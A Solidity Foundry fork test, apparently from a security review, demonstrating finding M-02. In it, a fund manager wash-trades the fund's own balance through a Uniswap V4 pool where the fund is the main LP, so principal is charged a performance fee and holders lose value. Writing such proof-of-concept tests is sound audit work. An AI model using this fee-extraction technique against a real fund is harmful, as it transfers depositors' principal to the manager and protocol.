// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";

import {UniswapV4Adapter} from "../../../src/adapters/UniswapV4Adapter.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {SpokeAForkBase, PoolTrader} from "../spoke-a/SpokeAForkBase.sol";

/// @notice (adapters review) The manager turns the fund's principal into "income" by wash-trading its Unallocated
///         Balance through a Mandate pool in which the fund is the main in-range LP, then collects and forwards it: the
///         Core Vault charges the performance fee on what was principal (DEC-107 charges it on income, no high-water
///         mark). Real Arbitrum One contracts: Uniswap V4 PoolManager, PositionManager, StateView, Permit2 and the
///         WETH/USDC 0.05% pool (docs/INTEGRATIONS.md); real CoreVault, hub SpokeVault and UniswapV4Adapter.
/// @notice Ported to fix/pp-sc-fix-independent-review (review M-02): STILL PRESENT. The LP fee cap (`MAX_POOL_FEE`,
///         1%) does not touch the live 0.05% pool, and the performance fee is still charged gross of the fees the fund
///         paid to itself (founder question 5 of the review, open). e5c778a: manager 288.04, protocol 288.04, holders
///         -1,461.50 on 6,000,000 of wash volume.
/// @dev Run: ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc ARBITRUM_FORK_BLOCK=<head - 300>
///      forge test -j 1 --match-path 'test/review/adapters/WashTradeIncomeFork.t.sol' -vv
contract WashTradeIncomeFork is SpokeAForkBase {
    uint256 internal constant ROUND_TRIPS = 60;
    uint256 internal constant LEG = 50_000e6;

    address internal protocolRecipient = makeAddr("protocol");

    struct Snapshot {
        uint256 shareAssets;
        uint256 holderIncome;
        uint256 manager;
        uint256 protocol;
    }

    /// @dev USDC value at the oracle (the fork base sets it to the pool price at the fork block).
    function _usd(uint256 wethAmount, uint256 usdcAmount) internal view returns (uint256) {
        (uint256 price1e18,) = prices.priceInUsdc(WETH);
        return wethAmount * price1e18 / 1e18 + usdcAmount;
    }

    function _snapshot() internal view returns (Snapshot memory s) {
        address mfv = vault.managerFeeVault();
        s.shareAssets = vault.shareAssets();
        s.holderIncome = _usd(vault.collectedIncome(WETH), vault.collectedIncome(USDC));
        s.manager = _usd(IERC20(WETH).balanceOf(mfv), IERC20(USDC).balanceOf(mfv));
        s.protocol = _usd(IERC20(WETH).balanceOf(protocolRecipient), IERC20(USDC).balanceOf(protocolRecipient));
    }

    function _tick() internal view returns (int24 tick) {
        (, tick,,) = IStateView(SV).getSlot0(PoolId.wrap(poolId));
    }

    /// @dev Steps 1-3: deposit, a USDC-only range just below the price, then a market sell that makes it two-sided.
    function _setUpFundAsMainLp() internal {
        _depositAs(alice, 1_000_000e6);
        vm.prank(manager);
        vault.allocateToHubSpokeVault(600_000e6);

        int24 hi = _floor10(tick0);
        bytes memory params = abi.encode(
            UniswapV4Adapter.OpenParams({
                tickLower: hi - 200,
                tickUpper: hi,
                liquidity: 0,
                amount0Max: 0,
                amount1Max: uint128(400_000e6),
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
        vm.prank(manager);
        (positionKey,,) = hubVault.openPosition(address(adapter), poolId, 0, 400_000e6, params);

        PoolTrader market = new PoolTrader(IPoolManager(PM), key);
        deal(WETH, address(market), 1000e18);
        market.swapTo(true, hi - 100);
        vm.prank(manager);
        hubVault.collectIncome(address(adapter), positionKey);
        if (hubVault.collectedIncome(WETH) != 0) hubVault.forwardIncomeToCoreVault(WETH);
        if (hubVault.collectedIncome(USDC) != 0) hubVault.forwardIncomeToCoreVault(USDC);
    }

    function test_POC_REVIEW_M02_washTradesPayThePerformanceFeeOnPrincipal() public {
        // 1-3. Alice deposits 1,000,000 USDC; the manager allocates 600,000 and places 400,000 in a 200-tick range just
        //      below the price; the market sells WETH into it down to its middle, so the fund is the main in-range LP.
        //      That trade's fees are legitimate income and are collected and forwarded before the window starts.
        _setUpFundAsMainLp();
        int24 tickStart = _tick();
        Snapshot memory before = _snapshot();

        // 4. Wash trades: nobody but the fund trades. Each round trip swaps 50,000 USDC of Unallocated Balance into WETH
        //    and all of that WETH back, through the fund's own range, with minAmountOut 0 (any minimum is accepted).
        for (uint256 i; i < ROUND_TRIPS; ++i) {
            vm.prank(manager);
            uint256 wethOut = hubVault.swapExactInput(address(adapter), poolId, USDC, LEG, 0, "");
            vm.prank(manager);
            hubVault.swapExactInput(address(adapter), poolId, WETH, wethOut, 0, "");
        }
        uint256 volumeUsdc = 2 * LEG * ROUND_TRIPS;

        // 5. The manager collects the position's income and anyone forwards it: the Core Vault splits the fee.
        vm.prank(manager);
        IAdapter.Amounts memory inc = hubVault.collectIncome(address(adapter), positionKey);
        hubVault.forwardIncomeToCoreVault(WETH);
        hubVault.forwardIncomeToCoreVault(USDC);
        Snapshot memory afterWash = _snapshot();

        uint256 incomeUsd = _usd(inc.income0, inc.income1);
        uint256 managerGain = afterWash.manager - before.manager;
        uint256 protocolGain = afterWash.protocol - before.protocol;
        uint256 holderLoss = before.shareAssets + before.holderIncome - afterWash.shareAssets - afterWash.holderIncome;
        // LP share of the swap fees at 500 pips of the volume (the pool also charges a Uniswap protocol fee).
        uint256 lpFeesOnVolume = volumeUsdc * 500 / 1_000_000;

        console2.log("round trips", ROUND_TRIPS);
        console2.log("wash volume (USDC)", volumeUsdc);
        console2.log("tick at start", int256(tickStart));
        console2.log("tick at end", int256(_tick()));
        console2.log("income collected, WETH", inc.income0);
        console2.log("income collected, USDC", inc.income1);
        console2.log("income collected (USDC at oracle)", incomeUsd);
        console2.log("LP fees on the volume at 0.05% (USDC)", lpFeesOnVolume);
        console2.log("fund's share of those LP fees (bps)", incomeUsd * 10_000 / lpFeesOnVolume);
        console2.log("Share Assets before", before.shareAssets);
        console2.log("Share Assets after", afterWash.shareAssets);
        console2.log("holders' value lost (Share Assets + Attributed Income)", holderLoss);
        console2.log("manager fee vault gain", managerGain);
        console2.log("protocol slice gain", protocolGain);

        // The wrong behaviour: income generated only by the fund's own swaps, paid out of its principal, is charged the
        // performance fee. 20% fee, 50% protocol slice: the manager takes 10% of it and the protocol 10%.
        assertGt(incomeUsd, lpFeesOnVolume * 8 / 10, "the fund's own range captured most of the LP fees it paid");
        assertApproxEqRel(managerGain, incomeUsd / 10, 0.01e18, "manager fee vault paid 10% of the washed income");
        assertApproxEqRel(protocolGain, incomeUsd / 10, 0.01e18, "protocol paid 10% of the washed income");
        assertGt(holderLoss, managerGain + protocolGain, "holders lost more than the fees taken on their principal");
        assertLt(afterWash.shareAssets, before.shareAssets - incomeUsd * 9 / 10, "principal left Share Assets");
    }
}
